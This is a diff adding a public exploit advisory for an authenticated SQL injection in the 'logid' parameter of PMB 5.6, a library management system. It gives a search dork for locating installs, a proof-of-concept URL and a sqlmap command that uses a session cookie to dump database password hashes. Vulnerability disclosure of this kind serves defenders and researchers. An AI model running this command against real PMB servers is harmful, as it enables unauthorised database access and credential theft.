@@ -1,0 +1,43 @@
+# Exploit Title: PMB 5.6 - 'logid' SQL Injection
+# Google Dork: inurl:opac_css
+# Date: 2020-04-20
+# Exploit Author: 41-trk (Tarik Bakir)
+# Vendor Homepage: http://www.sigb.net
+# Software Link: http://forge.sigb.net/redmine/projects/pmb/files
+# Affected versions : <= 5.6 
+
+-==== Software Description ====-
+
+PMB is a completely free ILS (Integrated Library management System). The domain of software for libraries is almost exclusively occupied by proprietary products.
+We are some librarians, users and developers deploring this state of affairs.
+ 
+PMB is based on web technology. This is what we sometimes call a 'web-app'.
+PMB requires an HTTP server (such as Apache, but this is not an obligation), the MySQL database and the PHP language.
+ 
+The main functions of PMB are :
+ 
+    * Supporting the UNIMARC format
+    * Authorities management (authors, publishers, series, subjects...)
+    * Management of loans, holds, borrowers...
+    * A user-friendly configuration
+    * The ability to import full bibliographic records
+    * A user-friendly OPAC integrating a browser
+    * Loans management with a module designed to serve even the very small establishments
+    * Serials management
+    * Simple administration procedures that can be handled easily even by the library staff...
+
+-==== Vulnerability ====-
+
+Variable $logid isn't properly sanitized in file /admin/sauvegarde/download.php, which allows ADMINISTRATION_AUTH to execute arbitrary SQL commands via the id parameter.
+
+-==== POC ====-
+
+http://localhost/[PMB_PATH]/admin/sauvegarde/download.php?logid=1 [SQLI]
+
+Using SQLMAP :
+
+./sqlmap.py -u "http://localhost/[PMB_PATH]/admin/sauvegarde/download.php?logid=1" -p logid --headers="Cookie: [VALID_USER_COOKIE]" --passwords
+
+-==== Exploit requirements ====-
+
+- You will need to be logged in in order to exploit the vulnerability.
